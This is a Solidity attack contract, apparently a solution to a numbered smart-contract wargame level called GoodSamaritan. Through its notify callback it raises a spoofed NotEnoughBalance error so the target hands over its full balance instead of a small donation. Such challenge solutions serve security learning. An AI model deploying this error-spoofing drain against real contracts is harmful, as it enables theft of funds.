pragma solidity >=0.8.0 <0.9.0;

import {INotifyable} from "./27-GoodSamaritan.sol";
import "../lib/forge-std/src/console2.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

interface ICoin {
    function balances(address target) external returns (uint256);
}

contract GoodSamaritanAttack is INotifyable {
    error NotEnoughBalance();

    IGoodSamaritan target;
    ICoin coin;
    address wallet;

    constructor(address targetAddress, address coinAddress, address walletAddress) {
        target = IGoodSamaritan(targetAddress);
        coin = ICoin(coinAddress);
        wallet = walletAddress;
    }

    function attack() public {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (coin.balances(wallet) != 0) {
            revert NotEnoughBalance();
        }
    }
}
